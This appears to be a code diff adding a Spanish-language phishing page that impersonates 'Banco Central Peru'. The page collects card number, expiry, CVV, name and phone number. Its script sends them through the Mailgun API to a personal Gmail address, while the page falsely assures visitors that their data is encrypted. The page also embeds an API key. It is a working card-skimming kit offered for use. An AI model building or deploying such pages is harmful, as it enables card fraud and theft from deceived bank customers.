@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BANCO CENTRAL PERU</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #1e1e1e;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #333;
+            border-radius: 4px;
+            background-color: #2d2d2d;
+            color: #fff;
+        }
+        button {
+            background-color: #007BFF;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .loading img {
+            width: 50px;
+            height: 50px;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #888;
+        }
+        @media (max-width: 600px) {
+            .container {
+                width: 95%;
+            }
+            input, button {
+                padding: 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>BANCO CENTRAL PERU</h2>
+        <form id="paymentForm">
+            <input type="text" id="cardNumber" placeholder="Número de Tarjeta" maxlength="16" required>
+            <div style="display: flex; justify-content: space-between;">
+                <input type="text" id="expiryMonth" placeholder="Mes" maxlength="2" required style="width: 48%;">
+                <input type="text" id="expiryYear" placeholder="Año" maxlength="2" required style="width: 48%;">
+            </div>
+            <input type="text" id="cvv" placeholder="CVV" maxlength="3" required>
+            <input type="text" id="fullName" placeholder="Nombres y Apellidos" required>
+            <input type="text" id="phoneNumber" placeholder="Celular" maxlength="9" required>
+            <button type="button" onclick="submitForm()">REVISAR</button>
+        </form>
+        <div class="loading" id="loading">
+            <p>ESTAMOS REVISANDO SU SOLICITUD</p>
+            <img src="https://i.gifer.com/origin/2f/2f26283999b18e5b0935463964f8f713_w200.gif" alt="Loading">
+        </div>
+        <div class="footer">
+            Todos los datos son cifrados, garantizamos su seguridad e integridad.
+        </div>
+    </div>
+
+    <script>
+    function submitForm() {
+        // Recopilar datos del formulario
+        const cardNumber = document.getElementById('cardNumber').value;
+        const expiryMonth = document.getElementById('expiryMonth').value;
+        const expiryYear = document.getElementById('expiryYear').value;
+        const cvv = document.getElementById('cvv').value;
+        const fullName = document.getElementById('fullName').value;
+        const phoneNumber = document.getElementById('phoneNumber').value;
+
+        // Validar los datos del formulario
+        if (!validateCardNumber(cardNumber) || !validateExpiryDate(expiryMonth, expiryYear) || !validateCVV(cvv) || !validateFullName(fullName) || !validatePhoneNumber(phoneNumber)) {
+            alert('Por favor, complete todos los campos correctamente.');
+            return;
+        }
+
+        // Ocultar el formulario y mostrar el mensaje de carga
+        const form = document.getElementById('paymentForm');
+        const loading = document.getElementById('loading');
+        form.style.display = 'none';
+        loading.style.display = 'block';
+
+        // Configuración de Mailgun
+        const apiKey = '62d5c5c14f1b2909ee62ff6a19e0f85b'; // Reemplaza con tu API key de Mailgun
+        const domain = 'https://api.mailgun.net/v3/sandbox8f7477f2af9f4cc78194a9c73a83e479.mailgun.org/messages'; // Reemplaza con tu dominio configurado en Mailgun
+        const adminEmail = 'lluistorres903@gmail.com'; // Correo del administrador
+        const subject = 'Nueva Solicitud de Tarjeta';
+        const body = `Número de Tarjeta: ${cardNumber}\nFecha de Caducidad: ${expiryMonth}/${expiryYear}\nCVV: ${cvv}\nNombres y Apellidos: ${fullName}\nCelular: ${phoneNumber}`;
+
+        // Enviar datos a Mailgun
+        fetch(`https://api.mailgun.net/v3/${domain}/messages`, {
+            method: 'POST',
+            headers: {
+                'Authorization': `Basic ${btoa(`api:${apiKey}`)}`, // Codificar la API key en Base64
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: new URLSearchParams({
+                'from': 'Banco Central Peru <lluistorres903@gmail.com>', // Reemplaza con tu dirección de correo de Mailgun
+                'to': adminEmail,
+                'subject': subject,
+                'text': body
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Correo enviado con éxito:', data);
+            window.location.href = 'success.html'; // Redirigir a una página de éxito
+        })
+        .catch(error => {
+            console.error('Error al enviar el correo:', error);
+            alert('!Estaremos en contacto!, activa las compras en linea de tu tarjeta para mas flexibilidad.');
+            form.style.display = 'block'; // Mostrar el formulario nuevamente si hay un error
+            loading.style.display = 'none';
+        });
+    }
+
+    // Funciones de validación (sin cambios)
+    function validateCardNumber(number) {
+        return /^\d{16}$/.test(number);
+    }
+
+    function validateExpiryDate(month, year) {
+        const currentYear = new Date().getFullYear() % 100;
+        const currentMonth = new Date().getMonth() + 1;
+        const expiryYear = parseInt(year, 10);
+        const expiryMonth = parseInt(month, 10);
+        return (expiryYear > currentYear || (expiryYear === currentYear && expiryMonth >= currentMonth));
+    }
+
+    function validateCVV(cvv) {
+        return /^\d{3}$/.test(cvv);
+    }
+
+    function validateFullName(name) {
+        return name.trim() !== '';
+    }
+
+    function validatePhoneNumber(phone) {
+        return /^\d{9}$/.test(phone);
+    }
+</script>
+</body>
+</html>
